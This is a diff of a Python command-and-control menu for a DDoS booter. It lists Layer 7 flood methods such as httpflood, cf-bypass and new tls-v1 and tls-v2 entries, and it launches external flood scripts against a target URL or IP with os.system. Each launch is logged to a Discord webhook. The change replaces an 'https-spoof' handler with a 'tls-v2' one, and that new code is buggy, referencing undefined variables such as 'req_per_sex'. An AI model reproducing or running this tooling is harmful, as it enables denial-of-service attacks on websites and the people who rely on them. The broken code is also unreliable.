@@ -83,9 +83,9 @@ def layer7():
                               \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mc<empty>          \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls-v1              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls-v2              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
@@ -419,17 +419,17 @@ def main():
                 print('Usage: tls <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
     
-        elif "https-spoof" in cnc:
+        elif "tls-v2" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
                 device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+                send_discord_webhook(webhook_url, f"\n\n---------------\nTLS-V2\n---------------\nTarget: {url}\nTime: {time}\nReq_Per_Sec: {req_per_sex}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
+                os.system(f'node TLS-V2 {url} {time} {req_per_sec} {thread}')
             except IndexError:
-                print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')
+                print('Usage: tls-v2 <url> <time> <req_per_sec> <threads>')
+                print('Example: tls-v2 https://example.com 60 10 1')
     
         elif "slow" in cnc:
             try:
